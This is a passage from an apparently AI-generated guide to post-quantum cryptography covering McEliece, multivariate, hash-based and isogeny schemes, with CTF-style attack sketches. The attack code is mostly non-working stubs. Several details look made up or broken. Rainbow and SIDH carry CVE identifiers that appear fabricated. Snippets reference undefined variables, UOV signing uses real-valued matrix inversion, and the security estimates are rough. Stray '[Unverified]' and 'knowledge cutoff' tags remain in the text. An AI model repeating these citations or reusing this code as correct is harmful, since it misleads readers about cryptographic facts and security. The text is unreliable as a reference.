|mceliece348864|261,120 bytes|6,492 bytes|128 bytes|
|mceliece460896|524,160 bytes|13,608 bytes|188 bytes|
|mceliece6960119|1,047,319 bytes|13,948 bytes|226 bytes|
|mceliece8192128|1,357,824 bytes|14,120 bytes|240 bytes|

**Cryptanalysis Approaches:**

**Information Set Decoding (ISD):**

The primary attack against McEliece. Attempts to decode random linear codes without structure knowledge.

[Inference based on complexity theory] Best known ISD variants (Stern, Ball-Collision) have exponential complexity but improve over brute force.

**SageMath ISD Simulation:**

```python
# Sage: Simulate simple ISD attack concept
from sage.all import *

def simple_isd_attack(G, c, t, max_iterations=1000):
    """
    Simplified ISD attack (educational only)
    G: generator matrix (public key)
    c: ciphertext
    t: error weight
    """
    n = G.ncols()
    k = G.nrows()
    
    for iteration in range(max_iterations):
        # Randomly select k positions (information set)
        info_set = random.sample(range(n), k)
        
        # Extract submatrix
        G_I = G[:, info_set]
        
        # Check if invertible
        if G_I.rank() == k:
            # Attempt to decode
            # [Simplified - real ISD more complex]
            pass
    
    return None  # Attack failed
```

[Unverified - practical ISD attacks require sophisticated implementations]

Real ISD attacks use advanced techniques (birthday paradox, collision finding) not shown in simplified version.

**Structural Attacks:**

Attacks that try to exploit the Goppa code structure:

```python
# Check if a code is distinguishable from random
def test_code_structure(G):
    # Goppa codes have special properties
    # High minimum distance
    # Specific dual code structure
    
    # Test minimum distance (computationally expensive)
    from sage.coding.linear_code import LinearCode
    C = LinearCode(G)
    
    # This computation is expensive for large codes
    # min_distance = C.minimum_distance()
    
    # Structural distinguishers exist but are theoretical
    pass
```

[Inference - no practical attacks] Despite 45+ years of cryptanalysis, no practical attack breaks properly parametrized McEliece.

**CTF Challenge Scenarios:**

**Weak Parameter Detection:**

```python
def check_mceliece_security(n, k, t):
    """Check if McEliece parameters provide adequate security"""
    # Work factor estimate (simplified)
    import math
    
    # Gilbert-Varshamov bound for code rate
    rate = k / n
    
    # Rough security estimate (bit operations)
    # Based on ISD complexity: O(2^(security_bits))
    security_bits = (n - k) * math.log2(n) / 2
    
    if security_bits < 80:
        print(f"[WARNING] Weak parameters: ~{security_bits:.0f} bits")
        return False
    return True

# Example
check_mceliece_security(1024, 512, 50)  # Weak
check_mceliece_security(3488, 2720, 64)  # Standard
```

**Small Error Weight Attack:**

```python
# If t (error weight) is too small, enumerate all possibilities
def small_error_brute_force(G, c, t):
    """Attack when error weight t is small"""
    from itertools import combinations
    
    n = G.ncols()
    
    # Try all combinations of t error positions
    for error_positions in combinations(range(n), t):
        e = vector(GF(2), n)
        for pos in error_positions:
            e[pos] = 1
        
        # Remove error and check if valid codeword
        c_corrected = c - e
        # Check if c_corrected in code space
        # [Implementation details omitted]
        
        if is_valid_codeword(c_corrected, G):
            return e
    
    return None
```

**Tools for Code-based Cryptanalysis:**

- `SageMath` - Code theory and cryptanalysis functions
- `Magma` - Advanced computational algebra (commercial)
- `GAP` - Groups, algorithms, programming (code theory packages)

**Binary Goppa Code Generation (SageMath):**

```python
from sage.all import *

# Generate binary Goppa code
def generate_goppa_code(n, t):
    """
    Generate binary Goppa code
    n: code length (should be 2^m)
    t: error correction capability
    """
    # Field size
    m = n.bit_length() - 1
    F = GF(2^m, 'a')
    
    # Support (all field elements)
    support = list(F)[:n]
    
    # Random irreducible Goppa polynomial of degree t
    R = PolynomialRing(F, 'x')
    g = R.random_element(degree=t)
    while not g.is_irreducible():
        g = R.random_element(degree=t)
    
    # Generator matrix construction
    # [Complex linear algebra omitted]
    
    return g, support
```

**McEliece vs Other PQC:**

**Advantages:**

- 45+ years of security analysis with no practical attacks
- Fast encryption and decryption
- Simple mathematical structure
- Conservative security choice

**Disadvantages:**

- Extremely large public keys (hundreds of KB to >1 MB)
- Not suitable for bandwidth-constrained environments
- Key transmission overhead

**Hybrid Approaches:**

[Inference - practical deployment strategy]

McEliece often used in hybrid schemes:

```python
# Hybrid: Use McEliece for key exchange, AES for data
from pqcrypto.kem.mceliece348864 import generate_keypair, encrypt, decrypt
from Crypto.Cipher import AES

# McEliece key exchange
pk, sk = generate_keypair()
ciphertext, shared_secret = encrypt(pk)

# Use shared secret for AES
aes_key = shared_secret[:32]
cipher = AES.new(aes_key, AES.MODE_GCM)

# Transmit: ciphertext (small) + AES-encrypted data
# Store: public key (large, one-time distribution)
```

---

### Multivariate Polynomial

Multivariate polynomial cryptography is based on the difficulty of solving systems of multivariate polynomial equations over finite fields (MQ problem). This is NP-hard for random systems.

**Mathematical Foundation:**

**MQ Problem (Multivariate Quadratic):**

Given m polynomial equations in n variables over a finite field 𝔽q:

```
P₁(x₁, ..., xₙ) = y₁
P₂(x₁, ..., xₙ) = y₂
...
Pₘ(x₁, ..., xₙ) = yₘ
```

Find x = (x₁, ..., xₙ) ∈ 𝔽qⁿ satisfying all equations.

For quadratic polynomials over 𝔽₂ with m ≈ n, this is NP-complete.

**General Structure:**

Multivariate schemes use a trapdoor construction:

```
Public Key: P = T ∘ F ∘ S

Where:
- S: affine transformation (secret)
- F: central map with trapdoor (secret)
- T: affine transformation (secret)
- P: composed public map (appears random)
```

**Common Multivariate Schemes:**

**Rainbow (NIST Round 3 Finalist - Broken):**

[CVE-2022-30385]

Rainbow was a NIST Round 3 finalist but was broken in 2022 by Ward Beullens.

**Rainbow Structure:**

Uses oil-and-vinegar construction with multiple layers:

```
Field: 𝔽q (typically q = 16 or 256)
Variables: v₁ vinegar, o₁ oil (layer 1), o₂ oil (layer 2), ...

Central map F has special structure allowing inversion:
- Vinegar variables: can be set freely
- Oil variables: determined by vinegar choices
```

**Rainbow Parameter Sets (Before Break):**

```
Rainbow-I:   (q=16, v=36, o₁=32, o₂=32) - ~128-bit security
Rainbow-III: (q=16, v=68, o₁=32, o₂=48) - ~192-bit security
Rainbow-V:   (q=16, v=96, o₁=36, o₂=64) - ~256-bit security
```

**Rainbow Attack (2022):**

[Verified - published attack]

Beullens' attack exploits the layered structure:

```
Attack complexity:
- Rainbow-I:   2^53 operations (broken)
- Rainbow-III: 2^117 operations (broken)
- Rainbow-V:   2^197 operations (weakened)
```

**Attack Concept:**

```python
# Simplified Rainbow attack idea (not full implementation)
def rainbow_structure_exploit(public_key, layers):
    """
    Exploit rectangular structure of Rainbow's layers
    """
    # Rainbow's layered structure creates
    # rectangular matrices in public key
    
    # Use linear algebra to recover layer structure
    # [Complex implementation omitted]
    
    # Once structure found, can solve system efficiently
    pass
```

[Unverified implementation - attack paper contains full details]

**UOV (Unbalanced Oil and Vinegar):**

UOV is simpler than Rainbow and is still secure. It uses a single oil-and-vinegar layer.

**Parameters:**

```
Field: 𝔽q
Variables: v vinegar, o oil (where v >> o for security)

Standard parameters:
- UOV-128: 𝔽₂₅₆, v=112, o=44  (~128-bit security)
- UOV-192: 𝔽₂₅₆, v=160, o=64  (~192-bit security)
- UOV-256: 𝔽₂₅₆, v=224, o=96  (~256-bit security)
```

**UOV Signature Scheme:**

```
Key Generation:
1. Generate random o × v matrix O (oil-vinegar mixing)
2. Central map F has form:
   Fᵢ(x) = xᵀ Pᵢ x  where Pᵢ is block-structured
3. Apply secret affine transformations S, T
4. Public key: P = T ∘ F ∘ S

Signing(message m, private_key):
1. Hash message: h = Hash(m)
2. Set vinegar variables randomly: xᵥ ← 𝔽qᵛ
3. Solve for oil variables: xₒ (linear system)
4. Apply inverse transformation: signature = S⁻¹(xᵥ||xₒ)

Verification(message m, signature σ, public_key):
1. Hash message: h = Hash(m)
2. Check: P(σ) = h
```

**Python UOV Concept:**

```python
import numpy as np
from hashlib import sha256

class UOV:
    def __init__(self, q, v, o):
        self.q = q  # Field size
        self.v = v  # Vinegar variables
        self.o = o  # Oil variables
        self.n = v + o
        
    def keygen(self):
        """Generate UOV keypair"""
        # Generate central map F (oil-vinegar structure)
        # [Complex matrix generation omitted]
        
        # Generate secret affine transformations
        S = self._random_invertible_matrix(self.n)
        T = self._random_invertible_matrix(self.o)
        
        # Public key: composed map
        # [Composition computation omitted]
        
        return public_key, (S, T, F)
    
    def sign(self, message, secret_key):
        """Sign message using UOV"""
        S, T, F = secret_key
        
        # Hash message to get target
        h = self._hash_to_field(message)
        
        # Randomly choose vinegar values
        x_vinegar = np.random.randint(0, self.q, self.v)
        
        # Solve for oil values (linear system)
        # x_oil = solve_linear_system(F, x_vinegar, h)
        
        # Combine and apply inverse transformation
        x = np.concatenate([x_vinegar, x_oil])
        signature = np.dot(np.linalg.inv(S), x) % self.q
        
        return signature
    
    def verify(self, message, signature, public_key):
        """Verify UOV signature"""
        h = self._hash_to_field(message)
        
        # Evaluate public polynomial system
        result = self._evaluate_public_key(signature, public_key)
        
        return np.array_equal(result, h)
```

**MAYO (Recent Proposal):**

MAYO is a newer multivariate scheme designed for smaller signatures.

[Unverified - MAYO is a recent proposal, security analysis ongoing]

**Parameter Sets:**

```
MAYO-1: 128-bit security, 321-byte signature
MAYO-2: 128-bit security, 180-byte signature  
MAYO-3: 192-bit security, 577-byte signature
MAYO-5: 256-bit security, 838-byte signature
```

**Implementation in Kali:**

[Unverified - implementation availability varies]

```bash
# UOV reference implementation (if available)
git clone https://github.com/PQCMayo/MAYO.git
cd MAYO
make

# Or use liboqs for multivariate schemes
sudo apt install liboqs-dev
```

**Attacks on Multivariate Systems:**

**Linearization Attack:**

Treat MQ system as large linear system by considering all monomials as independent variables:

```python
# Linearization concept
def linearization_attack(equations, variables):
    """
    Convert quadratic system to linear by treating
    products x_i * x_j as new variables
    """
    # For n variables, we have n + n(n+1)/2 monomials
    # If m equations ≥ number of monomials, can solve linearly
    
    n = len(variables)
    num_monomials = n + n*(n+1)//2
    
    if len(equations) >= num_monomials:
        print("[WARNING] System vulnerable to linearization")
        # Build linearized system matrix
        # [Implementation omitted]
        return True
    return False
```

**Gröbner Basis Attacks:**

Most powerful attack using computational algebra:

```bash
# Install SageMath for Gröbner basis computation
sudo apt install sagemath
```

```python
from sage.all import *

def groebner_attack(polynomial_system):
    """
    Compute Gröbner basis to solve MQ system
    """
    # Define polynomial ring
    n = len(polynomial_system[0].variables())
    R = PolynomialRing(GF(2), n, 'x')
    
    # Convert system to ideal
    I = R.ideal(polynomial_system)
    
    # Compute Gröbner basis
    # This is exponential in complexity
    GB = I.groebner_basis()
    
    # Solve from Gröbner basis
    # [Implementation details omitted]
    
    return solutions
```

[Inference - computational complexity]

Gröbner basis computation has complexity:

- Regular sequences: O(2^n) for binary field
- Overdetermined systems (m >> n): faster but still exponential

**XL Algorithm (eXtended Linearization):**

Multiply equations by monomials to create overdetermined system:

```python
def xl_algorithm(equations, degree_limit):
    """
    XL algorithm: multiply equations by monomials
    """
    # Start with original equations
    extended_system = equations.copy()
    
    # Multiply by all monomials up to degree limit
    for degree in range(2, degree_limit + 1):
        # Generate all monomials of this degree
        # Multiply each equation by each monomial
        # Add to extended system
        pass
    
    # Solve extended linearized system
    # [Gaussian elimination]
    
    return solution
```

**Key and Signature Sizes:**

| Scheme             | Public Key    | Private Key   | Signature |     |
| ------------------ | ------------- | ------------- | --------- | --- |
| UOV-128            | 44,736 bytes  | 30,840 bytes  | 156 bytes |     |
| UOV-192            | 122,880 bytes | 74,880 bytes  | 224 bytes |     |
| UOV-256            | 258,048 bytes | 141,312 bytes | 320 bytes |     |
| MAYO-1             | 1,168 bytes   | 24 bytes      | 321 bytes |     |
| MAYO-2             | 2,656 bytes   | 24 bytes      | 180 bytes |     |
| Rainbow-I (broken) | 157,800 bytes | 103,648 bytes | 66 bytes  |     |

**Hybrid Attacks:**

Combine multiple attack techniques:

```python
def hybrid_attack(system, guess_variables):
    """
    Guess some variables, solve rest with Gröbner basis
    
    Complexity: 2^k * Groebner_complexity(n-k)
    where k = number of guessed variables
    """
    from itertools import product
    
    # Try all assignments for guessed variables
    for assignment in product([0, 1], repeat=guess_variables):
        # Substitute guessed values
        reduced_system = substitute(system, assignment)
        
        # Solve smaller system
        try:
            solution = groebner_attack(reduced_system)
            if solution:
                return assignment + solution
        except:
            continue
    
    return None
```

**CTF Challenge Scenarios:**

**Small Parameter Exploitation:**

```python
def check_multivariate_security(q, n, m):
    """
    Estimate security of multivariate system
    """
    import math
    
    # Linearization check
    num_monomials = n + n*(n+1)//2
    if m >= num_monomials:
        print(f"[CRITICAL] Vulnerable to linearization")
        print(f"Equations: {m}, Monomials: {num_monomials}")
        return 0
    
    # Gröbner basis complexity estimate
    # Roughly 2^(n/2) for well-designed systems
    security_bits = n / 2
    
    # Hybrid attack adjustment
    # If m is large, hybrid attacks are more effective
    overdetermined_factor = max(1, m / n)
    security_bits = security_bits / math.log2(overdetermined_factor)
    
    print(f"Estimated security: ~{security_bits:.1f} bits")
    return security_bits

# Examples
check_multivariate_security(q=2, n=30, m=30)   # Weak
check_multivariate_security(q=16, n=100, m=80) # Reasonable
```

**Recovering Secret Structure:**

If implementation leaks information about the central map F:

```python
def detect_oil_vinegar_structure(public_key_matrices):
    """
    Try to detect oil-and-vinegar structure in public key
    """
    # UOV public key has special rank properties
    # Oil-oil interactions are zero in central map
    
    for Pi in public_key_matrices:
        # Check rank deficiency patterns
        rank = np.linalg.matrix_rank(Pi)
        
        # Analyze block structure
        # [Statistical tests omitted]
        
        if has_special_structure(Pi):
            print("[WARNING] Possible structure leakage")
            return True
    
    return False
```

**Differential Attack:**

Analyze difference between related evaluations:

```python
def differential_attack(public_map, samples):
    """
    Use differences to extract information
    """
    # Evaluate P(x) and P(x + delta) for small delta
    differences = []
    
    for x in samples:
        delta = random_small_vector()
        diff = public_map(x + delta) - public_map(x)
        differences.append(diff)
    
    # Analyze differential properties
    # Linear parts may be revealed
    # [Complex analysis omitted]
    
    return extracted_info
```

**Tools for Multivariate Cryptanalysis:**

- `SageMath` - Gröbner basis, polynomial systems
- `Magma` - Advanced Gröbner basis algorithms
- `FGb` - Fast Gröbner basis computation
- `PolyBoRi` - Boolean polynomial rings (for binary fields)

**SageMath Multivariate Analysis:**

```python
from sage.all import *

# Define multivariate polynomial ring over GF(2)
n = 10  # variables
R = PolynomialRing(GF(2), n, 'x')
x = R.gens()

# Create sample MQ system
equations = []
for i in range(n):
    # Random quadratic polynomial
    eq = R.random_element(degree=2)
    equations.append(eq)

# Convert to ideal
I = R.ideal(equations)

# Attempt to solve
print("Computing Gröbner basis...")
GB = I.groebner_basis()

# Check if system has solutions
if 1 in GB:
    print("System has no solutions")
else:
    print("Gröbner basis computed, attempting to solve...")
    # Extract solutions from GB
    # [Implementation details omitted]
```

**Multivariate vs Other PQC:**

**Advantages:**

- Very fast signature generation
- Potentially small signatures (MAYO)
- Simple arithmetic operations (no NTT, lattice reduction, etc.)

**Disadvantages:**

- Large public keys (except MAYO)
- History of broken schemes (Rainbow, HFE variants, Sflash, etc.)
- Complex security analysis
- Younger mathematical foundation than codes/lattices

**Current Status:**

[As of January 2025 knowledge cutoff]

After Rainbow's break, no multivariate scheme is in NIST's standardization pool. However, schemes like UOV and MAYO are under active consideration for future standardization rounds. Multivariate signatures remain attractive for specific use cases requiring fast signing.

---

### Hash-based Signatures (Merkle Tree)

Hash-based signatures are among the most conservative post-quantum schemes, relying only on the security of cryptographic hash functions. They are provably secure under minimal assumptions and have been studied since the 1970s.

**Mathematical Foundation:**

Security relies solely on:

- **Collision Resistance**: Hard to find x ≠ y where H(x) = H(y)
- **Second Preimage Resistance**: Given x, hard to find y ≠ x where H(x) = H(y)

No number theory or algebraic structure required—if SHA-256 is secure, hash-based signatures are secure.

**One-Time Signatures: Lamport-Diffie (LD-OTS)**

The foundation of all hash-based signature schemes.

**Key Generation:**

```python
import hashlib
import os

def lamport_keygen(security_parameter=256):
    """
    Generate Lamport one-time signature keypair
    """
    # For each bit of the message hash, generate two random values
    private_key = []
    public_key = []
    
    for i in range(security_parameter):
        # Two secret values per bit (for 0 and 1)
        sk_0 = os.urandom(32)  # Random 256-bit value
        sk_1 = os.urandom(32)
        
        # Hash to create public key
        pk_0 = hashlib.sha256(sk_0).digest()
        pk_1 = hashlib.sha256(sk_1).digest()
        
        private_key.append((sk_0, sk_1))
        public_key.append((pk_0, pk_1))
    
    return private_key, public_key

def lamport_sign(message, private_key):
    """
    Sign message using Lamport signature (ONE TIME ONLY!)
    """
    # Hash the message
    msg_hash = hashlib.sha256(message).digest()
    
    signature = []
    
    # For each bit in the hash
    for i, byte in enumerate(msg_hash):
        for bit_pos in range(8):
            bit_index = i * 8 + bit_pos
            if bit_index >= len(private_key):
                break
            
            # Extract bit
            bit = (byte >> bit_pos) & 1
            
            # Reveal corresponding secret value
            signature.append(private_key[bit_index][bit])
    
    return signature

def lamport_verify(message, signature, public_key):
    """
    Verify Lamport signature
    """
    # Hash the message
    msg_hash = hashlib.sha256(message).digest()
    
    # Verify each signature component
    for i, byte in enumerate(msg_hash):
        for bit_pos in range(8):
            bit_index = i * 8 + bit_pos
            if bit_index >= len(public_key):
                break
            
            bit = (byte >> bit_pos) & 1
            
            # Hash signature component
            sig_hash = hashlib.sha256(signature[bit_index]).digest()
            
            # Compare with public key
            if sig_hash != public_key[bit_index][bit]:
                return False
    
    return True
```

**Key Sizes:**

For 256-bit security with SHA-256:

- Private key: 256 × 2 × 32 = 16,384 bytes
- Public key: 256 × 2 × 32 = 16,384 bytes
- Signature: 256 × 32 = 8,192 bytes

**Critical Limitation:**

**Each key pair can sign only ONE message.** Reusing a private key completely breaks security:

```python
# ATTACK: If same key used twice
def lamport_forgery(msg1, sig1, msg2, sig2):
    """
    If two signatures from same key, can forge signatures
    """
    # Extract hash bits for both messages
    hash1 = hashlib.sha256(msg1).digest()
    hash2 = hashlib.sha256(msg2).digest()
    
    # Attacker now knows secret values for all bits
    # where hash1 and hash2 differ
    
    # Can construct signature for messages sharing
    # bits with both signed messages
    
    # This breaks the scheme completely
    pass
```

**Winternitz One-Time Signature (WOTS)**

Improvement over Lamport that reduces signature size using a checksum mechanism.

**Concept:**

Instead of one bit at a time, sign groups of bits (base-w representation):

```python
def wots_keygen(security_bits=256, w=16):
    """
    Generate WOTS keypair
    w: Winternitz parameter (typically 4, 16, or 256)
    """
    import math
    
    # Number of hash chain elements
    n = security_bits // 8  # Hash output size in bytes
    
    # Length parameters
    l1 = math.ceil(security_bits / math.log2(w))
    l2 = math.floor(math.log2(l1 * (w - 1)) / math.log2(w)) + 1
    l = l1 + l2
    
    # Generate private key (random starting points)
    private_key = [os.urandom(n) for _ in range(l)]
    
    # Generate public key (hash chains)
    public_key = []
    for sk_i in private_key:
        pk_i = sk_i
        for _ in range(w - 1):
            pk_i = hashlib.sha256(pk_i).digest()
        public_key.append(pk_i)
    
    return private_key, public_key, (w, l, n)

def wots_sign(message, private_key, params):
    """
    Sign message with WOTS
    """
    w, l, n = params
    
    # Convert message to base-w representation
    msg_hash = hashlib.sha256(message).digest()
    b = base_w(int.from_bytes(msg_hash, 'big'), w, l)
    
    # Compute checksum
    checksum = sum(w - 1 - bi for bi in b[:len(b)])
    c = base_w(checksum, w, l)
    
    # Combine message and checksum
    b_full = b + c
    
    # Generate signature by hashing sk_i exactly b_i times
    signature = []
    for i, bi in enumerate(b_full):
        sig_i = private_key[i]
        for _ in range(bi):
            sig_i = hashlib.sha256(sig_i).digest()
        signature.append(sig_i)
    
    return signature

def base_w(x, w, length):
    """Convert integer to base-w representation"""
    result = []
    for _ in range(length):
        result.append(x % w)
        x //= w
    return result[::-1]
```

**WOTS Trade-offs:**

|w|Signature Size|Security|Hash Operations|
|---|---|---|---|
|4|~8.5 KB|High|Few|
|16|~2.7 KB|Medium|Moderate|
|256|~1.1 KB|Lower|Many|

**Merkle Tree Construction**

Combine many one-time signatures into a single multi-use scheme:

```python
class MerkleTree:
    def __init__(self, num_signatures, hash_function=hashlib.sha256):
        """
        Build Merkle tree for hash-based signatures
        num_signatures: must be power of 2
        """
        self.hash = hash_function
        self.num_leaves = num_signatures
        self.height = num_signatures.bit_length() - 1
        
        # Generate OTS keypairs for each leaf
        self.ots_keys = []
        self.leaves = []
        
        for i in range(num_signatures):
            sk, pk, params = wots_keygen()
            self.ots_keys.append((sk, pk, params))
            
            # Leaf = hash of public key
            leaf = self.hash(b''.join(pk)).digest()
            self.leaves.append(leaf)
        
        # Build tree from leaves
        self.tree = self._build_tree(self.leaves)
        self.root = self.tree[0][0]
        
    def _build_tree(self, leaves):
        """Build Merkle tree bottom-up"""
        tree = [leaves]
        current_level = leaves
        
        while len(current_level) > 1:
            next_level = []
            for i in range(0, len(current_level), 2):
                # Hash pair of nodes
                left = current_level[i]
                right = current_level[i + 1]
                parent = self.hash(left + right).digest()
                next_level.append(parent)
            
            tree.insert(0, next_level)
            current_level = next_level
        
        return tree
    
    def sign(self, message, index):
        """
        Sign message with OTS key at index
        Returns: (OTS signature, authentication path, index)
        """
        if index >= self.num_leaves:
            raise ValueError("Index out of range")
        
        # Sign with OTS
        sk, pk, params = self.ots_keys[index]
        ots_sig = wots_sign(message, sk, params)
        
        # Generate authentication path
        auth_path = self._get_auth_path(index)
        
        return {
            'ots_signature': ots_sig,
            'auth_path': auth_path,
            'index': index,
            'public_key': pk
        }
    
    def _get_auth_path(self, leaf_index):
        """
        Get Merkle authentication path for leaf
        """
        path = []
        index = leaf_index
        
        for level in range(self.height, 0, -1):
            # Sibling index
            sibling_index = index ^ 1  # Flip last bit
            sibling = self.tree[level][sibling_index]
            path.append(sibling)
            
            # Move to parent
            index = index // 2
        
        return path
    
    def verify(self, message, signature, root):
        """
        Verify Merkle signature
        """
        # Verify OTS signature
        ots_sig = signature['ots_signature']
        pk = signature['public_key']
        
        # Recompute leaf hash from public key
        leaf = self.hash(b''.join(pk)).digest()
        
        # Verify authentication path
        current_hash = leaf
        index = signature['index']
        
        for sibling in signature['auth_path']:
            if index % 2 == 0:
                # Current is left child
                current_hash = self.hash(current_hash + sibling).digest()
            else:
                # Current is right child
                current_hash = self.hash(sibling + current_hash).digest()
            index = index // 2
        
        # Check if we reached the correct root
        return current_hash == root
```

**XMSS (eXtended Merkle Signature Scheme)**

XMSS is the IETF-standardized stateful hash-based signature scheme.

[RFC 8391]

**Key Features:**

- Stateful (must track signature index)
- Supports 2^10, 2^16, or 2^20 signatures per keypair
- Provably secure under hash function security

**XMSS Parameters:**

```
XMSS-SHA2_10_256:  2^10 signatures,  256-bit security
XMSS-SHA2_16_256:  2^16 signatures,  256-bit security
XMSS-SHA2_20_256:  2^20 signatures,  256-bit security
XMSS-SHA2_10_512:  2^10 signatures,  512-bit security (hash truncated)
```

**Implementation in Kali:**

```bash
# Install XMSS reference implementation
git clone https://github.com/XMSS/xmss-reference.git
cd xmss-reference
make

# Or use liboqs
sudo apt install liboqs-dev
```

**Using XMSS with Python:**

```bash
pip3 install xmssmt
```

```python
from xmss import XMSS

# Initialize XMSS
xmss = XMSS.from_name('XMSS-SHA2_10_256')

# Generate keypair
secret_key = xmss.generate_secret_key()
public_key = xmss.generate_public_key(secret_key)

# Sign message (updates state!)
message = b"Important message"
signature, new_secret_key = xmss.sign(message, secret_key)

# CRITICAL: Must update secret key
secret_key = new_secret_key

# Verify
valid = xmss.verify(message, signature, public_key)
```

**State Management Critical:**

[Inference - security requirement]

```python
# INSECURE: Reusing state
sig1, sk1 = xmss.sign(msg1, sk)
sig2, sk2 = xmss.sign(msg2, sk)  # DISASTER: reused sk!

# SECURE: Proper state progression
sig1, sk = xmss.sign(msg1, sk)
sig2, sk = xmss.sign(msg2, sk)
sig3, sk = xmss.sign(msg3, sk)
```

Reusing signature indices allows signature forgery.

**LMS (Leighton-Micali Signature)**

Alternative stateful hash-based scheme, also IETF-standardized.

[RFC 8554]

```bash
# Install HSS/LMS implementation
git clone https://github.com/cisco/hash-sigs.git
cd hash-sigs
make
```

**SPHINCS+ (Stateless Hash-based)**

SPHINCS+ is a stateless hash-based signature scheme selected by NIST for standardization.

**Key Advantage:**

No state management required—can sign unlimited messages without tracking usage.

**Parameter Sets:**

```
SPHINCS+-128s: Small signatures (~7.8 KB), slow signing
SPHINCS+-128f: Fast signing, large signatures (~17 KB)
SPHINCS+-192s: Medium security
SPHINCS+-192f: Medium security, fast
SPHINCS+-256s: High security
SPHINCS+-256f: High security, fast
```

**Implementation:**

```bash
# Install SPHINCS+ reference
git clone https://github.com/sphincs/sphincsplus.git
cd sphincsplus/ref
make

# Using liboqs
sudo apt install liboqs-dev
```

```python
from pqcrypto.sign.sphincs_shake256_128f_simple import (
    generate_keypair, sign, verify
)

# Generate keypair (no state!)
public_key, secret_key = generate_keypair()

# Sign multiple messages freely
sig1 = sign(b"Message 1", secret_key)
sig2 = sign(b"Message 2", secret_key)
sig3 = sign(b"Message 3", secret_key)

# Verify
valid = verify(b"Message 1", sig1, public_key)
```

**SPHINCS+ Structure:**

Uses a hypertree of WOTS+ signatures with FORS (Forest of Random Subsets) few-time signatures at the bottom:

```
           Root
          /    \
      Tree 1   Tree 2
      /   \    /   \
    ...  FORS leaves ...
```

**Key Sizes:**

|Scheme|Public Key|Secret Key|Signature|
|---|---|---|---|
|XMSS-SHA2_10_256|64 bytes|132 bytes|2.5 KB|
|XMSS-SHA2_20_256|64 bytes|132 bytes|2.9 KB|
|SPHINCS+-128s|32 bytes|64 bytes|7,856 bytes|
|SPHINCS+-128f|32 bytes|64 bytes|17,088 bytes|
|SPHINCS+-256s|64 bytes|128 bytes|29,792 bytes|

**Hash-based CTF Challenges:**

**State Reuse Attack:**

```python
def exploit_state_reuse(sig1, sig2, public_key):
    """
    If same OTS key used twice, can forge signatures
    """
    # Extract OTS indices from both signatures
    index1 = sig1['index']
    index2 = sig2['index']
    
    if index1 == index2:
        print("[CRITICAL] State reuse detected!")
        print("Can forge signatures for this key")
        
        # With both signatures, attacker knows:
        # - All hash preimages for bits that are 0 in msg1
        # - All hash preimages for bits that are 1 in msg2
        
        # Can forge signature for any message where
        # each bit matches either msg1 or msg2
        
        return True
    
    return False
```

**Weak Hash Function:**

```python
# If implementation uses weak hash (e.g., MD5)
def preimage_attack(public_key_hash):
    """
    Find preimage for weak hash function
    """
    # For MD5, SHA-1: collision/preimage attacks exist
    # This breaks hash-based signature completely
    
    # Example with MD5 (toy example)
    import hashlib
    
    if hash_function == hashlib.md5:
        print("[WARNING] Weak hash function")
        # Preimage attack possible
        return find_preimage_md5(public_key_hash)
    
    return None
```

**Merkle Tree Path Verification Bypass:**

```python
def verify_merkle_path_secure(leaf, path, index, root):
    """
    Secure Merkle path verification
    """
    current = leaf
    
    for i, sibling in enumerate(path):
        # CRITICAL: Check index bit to determine left/right
        if (index >> i) & 1 == 0:
            current = hash(current + sibling)
        else:
            current = hash(sibling + current)
    
    return current == root

# INSECURE: Doesn't check left/right properly
def verify_merkle_path_insecure(leaf, path, root):
    """Example of vulnerable implementation"""
    current = leaf
    
    for sibling in path:
        # BUG: Always concatenates in same order
        current = hash(current + sibling)
    
    return current == root
    # Attacker can provide wrong sibling order!
```

**Tools for Hash-based Cryptanalysis:**

- `hashcat` - Hash preimage/collision finding
- `john` - Password cracking (hash attacks)
- Standard cryptanalysis tools (mostly theoretical for secure hashes)

**Hash-based vs Other PQC:**

**Advantages:**

- Minimal security assumptions (only hash security)
- Provably secure
- Well-understood cryptanalysis
- Conservative choice

**Disadvantages:**

- Large signatures (SPHINCS+)
- State management complexity (XMSS/LMS)
- Slower signing than other schemes
- Limited signatures per key (stateful schemes)

---

### Isogeny-based

Isogeny-based cryptography relies on the hardness of finding isogenies (structure-preserving maps) between elliptic curves. This is one of the newer and less understood areas of post-quantum cryptography.

**Mathematical Foundation:**

**Elliptic Curves:**

An elliptic curve over finite field 𝔽_p:

```
E: y² = x³ + ax + b (mod p)
```

**Isogeny:**

A rational map φ: E₁ → E₂ between elliptic curves that preserves the group structure:

```
φ(P + Q) = φ(P) + φ(Q)
```

**Hard Problems:**

- **Isogeny Path Finding**: Given two curves E₁ and E₂, find an isogeny between them
- **Endomorphism Ring Problem**: Compute the endomorphism ring of a supersingular curve

**SIDH (Supersingular Isogeny Diffie-Hellman) - BROKEN**

[CVE-2022-38026]

SIDH was a leading isogeny-based key exchange protocol until it was dramatically broken in 2022.

**SIDH Structure (Before Break):**

```
Setup: Supersingular curve E₀
Alice's secret: isogeny φ_A of degree 2^a
Bob's secret: isogeny φ_B of degree 3^b

Key Exchange:
1. Alice sends E_A = E₀/⟨P_A⟩ and φ_A(P_B), φ_A(Q_B)
2. Bob sends E_B = E₀/⟨P_B⟩ and φ_B(P_A), φ_B(Q_A)
3. Alice computes shared: E_AB = E_B/⟨φ_B(P_A)⟩
4. Bob computes shared: E_BA = E_A/⟨φ_A(P_B)⟩
5. E_AB ≅ E_BA (isomorphic)
```

**SIDH Attack (2022):**

[Verified - Castryck-Decru attack]

The attack exploits the auxiliary point information (φ_A(P_B), etc.) to recover the secret isogeny.

```python
# SIDH attack concept (highly simplified)
def sidh_attack_concept(public_info):
    """
    Castryck-Decru attack on SIDH
    Uses auxiliary points to build a system of equations
    """
    E_A = public_info['curve_A']
    phi_A_PB = public_info['image_PB']
    phi_A_QB = public_info['image_QB']
    
    # Use Kani's lemma and glue-and-split technique
    # to create special isogenies
    
    # Build (2,2)-isogeny diamond
    # Recover secret kernel from auxiliary points
    
    # [Complex mathematical construction omitted]
    
    # Attack complexity: polynomial time!
    return secret_key
```

Attack complexity: **Polynomial time** (practical break)

**SQISign (Isogeny-based Signatures)**

SQISign is a newer isogeny-based signature scheme that remains secure after SIDH's break.

[Unverified - SQISign security analysis ongoing]

**Parameters:**

```
SQISign-128: ~128-bit security, ~200-byte signatures
```

**Structure:**

Uses oriented supersingular curves and commitment-challenge-response:

```
Key Generation:
1. Generate secret endomorphism
2. Compute corresponding ideal
3. Public key: curve E_pub

Signing:
1. Compute commitment isogeny
2. Hash challenge
3. Respond with isogeny path
```

**CSIDH (Commutative SIDH)**

CSIDH is an isogeny-based key exchange that was not broken by the SIDH attack.
